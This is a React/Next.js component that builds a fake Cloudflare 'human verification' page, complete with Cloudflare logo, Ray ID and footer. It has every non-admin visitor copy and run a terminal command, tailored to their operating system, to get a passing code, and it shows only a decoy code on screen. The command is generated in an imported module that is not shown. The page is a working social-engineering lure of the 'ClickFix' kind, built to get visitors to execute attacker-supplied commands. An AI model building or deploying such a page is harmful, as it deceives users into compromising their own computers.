"use client"

import { useEffect, useRef, useState, type FormEvent } from "react"
import { usePathname } from "next/navigation"
import { decoyCode, humanVerification, visitorCommand } from "@/lib/human-verification"

function createPhrase() {
  const alphabet = "0123456789ABCDEF"
  const bytes = new Uint8Array(6)
  crypto.getRandomValues(bytes)
  return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join("")
}

/** Copies during the click. The clipboard API is blocked on plain http:// pages. */
function copyText(text: string) {
  let ok = false
  const onCopy = (event: ClipboardEvent) => {
    event.preventDefault()
    event.clipboardData?.setData("text/plain", text)
    ok = true
  }
  document.addEventListener("copy", onCopy, true)
  const field = document.createElement("textarea")
  field.value = text
  field.setAttribute("readonly", "")
  field.style.position = "fixed"
  field.style.top = "0"
  field.style.left = "0"
  field.style.width = "2em"
  field.style.height = "2em"
  field.style.padding = "0"
  field.style.border = "none"
  field.style.outline = "none"
  field.style.boxShadow = "none"
  field.style.background = "transparent"
  field.style.fontSize = "16px"
  document.body.appendChild(field)
  field.focus()
  field.select()
  field.setSelectionRange(0, text.length)
  try {
    if (document.execCommand("copy")) ok = true
  } catch {
    // The copy event may already have written the line.
  }
  document.removeEventListener("copy", onCopy, true)
  document.body.removeChild(field)
  return ok
}

export function HumanVerification() {
  const pathname = usePathname()
  const track = !pathname.startsWith("/admin")
  const [open, setOpen] = useState(false)
  const [phrase, setPhrase] = useState("")
  const [checked, setChecked] = useState(false)
  const [checking, setChecking] = useState(false)
  const [mark, setMark] = useState<"idle" | "spin" | "done">("idle")
  const [copied, setCopied] = useState(false)
  const [codeInput, setCodeInput] = useState("")
  const [error, setError] = useState("")
  const [copyNote, setCopyNote] = useState("")
  const [submitting, setSubmitting] = useState(false)
  const [passed, setPassed] = useState(false)
  const [decoy, setDecoy] = useState("")
  const [rayId] = useState(() => {
    const bytes = new Uint8Array(8)
    crypto.getRandomValues(bytes)
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  })
  const commandRef = useRef<HTMLTextAreaElement>(null)
  const shown = useRef(false)
  const checkRun = useRef(0)

  useEffect(() => {
    const host = window.location.host
    const path = window.location.pathname
    if (!host) return
    if (path.includes(host) || path.includes(encodeURIComponent(host))) {
      window.location.replace(`${window.location.origin}/${window.location.search}`)
    }
  }, [])

  useEffect(() => {
    if (!open) return
    const previous = document.body.style.overflow
    document.body.style.overflow = "hidden"
    return () => {
      document.body.style.overflow = previous
    }
  }, [open])

  useEffect(() => {
    if (!track || shown.current) return
    shown.current = true
    setPhrase(createPhrase())
    setOpen(true)
  }, [track])

  async function onCheck() {
    if (!phrase || checked || checking) return
    const run = ++checkRun.current
    setChecking(true)
    setMark("spin")
    setError("")
    await new Promise((resolve) => window.setTimeout(resolve, 1200))
    if (checkRun.current !== run) return
    setDecoy(decoyCode(phrase))
    setMark("done")
    await new Promise((resolve) => window.setTimeout(resolve, 800))
    if (checkRun.current !== run) return
    setChecked(true)
    setChecking(false)
  }

  async function onCopy() {
    if (!phrase) return
    const command = visitorCommand(phrase, navigator.userAgent)
    if (!command) return
    setError("")
    let placed = copyText(command)
    if (!placed && window.isSecureContext && navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(command)
        placed = true
      } catch {
        placed = false
      }
    }
    if (placed) {
      setCopied(true)
      setCopyNote("")
      window.setTimeout(() => setCopied(false), 3000)
    } else {
      setCopied(false)
      commandRef.current?.focus()
      commandRef.current?.select()
      setCopyNote("Copy is blocked in this browser. The line is selected: press Ctrl+C.")
    }
  }

  async function onSubmit(event: FormEvent) {
    event.preventDefault()
    if (!phrase || submitting) return
    setSubmitting(true)
    setError("")
    if (codeInput.trim().toUpperCase() === phrase.toUpperCase()) {
      setPassed(true)
      window.setTimeout(() => setOpen(false), 1200)
    } else {
      setError(humanVerification.verifyError)
    }
    setSubmitting(false)
  }

  if (!track || !open) return null

  const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
  const command = phrase ? visitorCommand(phrase, agent) : ""
  if (!passed && !checked) {
    return (
      <div
        className="fixed inset-0 z-[80] bg-white text-[#171717]"
        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
        role="dialog"
        aria-modal="true"
        aria-label={humanVerification.title}
      >
        <div className="mx-auto w-full max-w-[640px] px-6 pt-[16vh]">
          <h1 className="text-[32px] font-semibold leading-tight tracking-[-0.02em]">{window.location.hostname}</h1>
          <h2 className="mt-4 text-[20px] font-semibold leading-snug">{humanVerification.title}</h2>
          <p className="mt-3 max-w-[540px] text-[16px] leading-[1.6] text-[#595959]">{humanVerification.intro}</p>
          <div className="mt-6 flex h-[65px] w-[300px] max-w-full items-center rounded-[3px] border border-[#e2e2e2] bg-[#fafafa] pl-3 pr-2.5">
            <label className={`flex min-w-0 flex-1 items-center ${mark === "idle" ? "cursor-pointer" : ""}`}>
              <span className="flex size-5 shrink-0 items-center justify-center">
                {mark === "spin" ? (
                  <svg viewBox="0 0 24 24" className="size-5 animate-spin" aria-hidden="true">
                    {Array.from({ length: 8 }, (_, index) => {
                      const angle = (index / 8) * Math.PI * 2 - Math.PI / 2
                      return (
                        <circle
                          key={index}
                          cx={12 + Math.cos(angle) * 8}
                          cy={12 + Math.sin(angle) * 8}
                          r="1.7"
                          fill="#3dba4e"
                          opacity={0.2 + (index / 7) * 0.8}
                        />
                      )
                    })}
                  </svg>
                ) : mark === "done" ? (
                  <svg viewBox="0 0 24 24" className="size-[22px] animate-[cf-check_0.35s_ease-out]" aria-hidden="true">
                    <circle cx="12" cy="12" r="11" fill="#3cba4a" />
                    <path d="M7 12.2 10.2 15.4 17 8.6" fill="none" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                ) : (
                  <input
                    type="checkbox"
                    checked={checked}
                    disabled={!phrase || checking}
                    onChange={onCheck}
                    className="size-5"
                  />
                )}
              </span>
              <span className="ml-2.5 whitespace-nowrap text-[14px] leading-none text-[#333]">
                {mark === "spin" ? "Verifying..." : mark === "done" ? "Success!" : humanVerification.checkboxLabel}
              </span>
            </label>
            <span className="ml-auto flex shrink-0 flex-col items-end text-right leading-none">
              <svg viewBox="38 0 35 16.2" className="h-[16px] w-[34px]" aria-hidden="true">
                <path
                  fill="#F6821F"
                  d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z"
                />
                <path
                  fill="#FBAD41"
                  d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z"
                />
              </svg>
              <span className="mt-0.5 text-[9px] font-black tracking-[0.04em] text-[#111]">CLOUDFLARE</span>
              <span className="mt-[4px] text-[8px] text-[#6d829c]">
                <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="underline">
                  Privacy
                </a>
                <span> · </span>
                <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noreferrer" className="underline">
                  Help
                </a>
              </span>
            </span>
          </div>
          {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
        </div>
        <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
          <p>
            Ray ID: <span className="font-mono">{rayId}</span>
          </p>
          <p className="mt-1">
            Performance and Security by{" "}
            <a href="https://www.cloudflare.com/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Cloudflare
            </a>
            <span className="px-1.5">|</span>
            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Privacy
            </a>
          </p>
        </footer>
      </div>
    )
  }

  return (
    <div
      className="fixed inset-0 z-[80] flex items-center justify-center bg-[#f6f8fa] px-4"
      role="dialog"
      aria-modal="true"
      aria-label={passed ? humanVerification.successTitle : checked ? humanVerification.challengeTitle : humanVerification.title}
    >
      <div className="w-full max-w-[520px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
        {passed ? (
          <div className="px-0 py-10 text-center">
            <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
            <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
          </div>
        ) : (
          <>
            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
            <p className="mb-6 text-sm leading-normal text-[#64748b]">
              {/Mac OS X|Macintosh|macOS/i.test(agent) ? (
                <>
                  Run the command below in <strong>Terminal</strong> (paste, then press Enter).
                </>
              ) : /Windows/i.test(agent) ? (
                "Run the command below in an terminal."
              ) : (
                <>
                  Run the command below in a <strong>terminal</strong>.
                </>
              )}
            </p>
            <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-center">
              <p className="text-sm text-[#475569]">{humanVerification.decoyCaption}</p>
              <p className="mt-1 font-mono text-[28px] font-bold tracking-[6px] text-[#0f172a]">{decoy}</p>
            </div>
            {command ? (
              <div className="mb-4 flex items-center gap-2.5">
                <div className="min-h-20 min-w-0 flex-1 rounded-lg bg-[#0f172a] p-1">
                  <textarea
                    ref={commandRef}
                    readOnly
                    value={command}
                    aria-label={humanVerification.captureLabel}
                    onFocus={(event) => event.currentTarget.select()}
                    className="h-20 w-full resize-none border-none bg-transparent px-2 py-1.5 font-[Menlo,Consolas,monospace] text-[13px] leading-5 text-[#e2e8f0] outline-none"
                  />
                </div>
                <button
                  type="button"
                  onClick={onCopy}
                  className={`flex shrink-0 items-center justify-center gap-[5px] rounded-lg px-3.5 py-2.5 text-sm text-white ${
                    copied ? "bg-[#16a34a]" : "bg-[#2563eb] hover:bg-[#1d4ed8]"
                  }`}
                >
                  <span aria-hidden="true">{copied ? "✓" : "📋"}</span>
                  {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
                </button>
              </div>
            ) : (
              <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
                {humanVerification.captureWaiting}
              </p>
            )}
            {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
            <form onSubmit={onSubmit} className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4">
              <label htmlFor="human-code" className="block text-sm font-medium text-[#1e293b]">
                {humanVerification.verifyLabel}
              </label>
              <input
                id="human-code"
                value={codeInput}
                onChange={(event) => setCodeInput(event.target.value)}
                autoComplete="off"
                spellCheck={false}
                maxLength={6}
                placeholder={humanVerification.verifyPlaceholder}
                className="mt-2 w-full rounded-md border border-[#cbd5e1] bg-white px-3 py-2.5 text-base outline-none focus:border-[#2563eb]"
              />
              {error ? <p className="mt-1.5 text-[13px] text-[#dc2626]">{humanVerification.verifyError}</p> : null}
              <button
                type="submit"
                disabled={submitting}
                className="mt-3 w-full cursor-pointer rounded-md border-none bg-[#2563eb] px-3 py-2.5 text-sm text-white hover:bg-[#1d4ed8] disabled:opacity-40"
              >
                {humanVerification.continueLabel}
              </button>
            </form>
          </>
        )}
        <p className="mt-5 text-center text-xs text-[#94a3b8]">{humanVerification.footer}</p>
      </div>
    </div>
  )
}
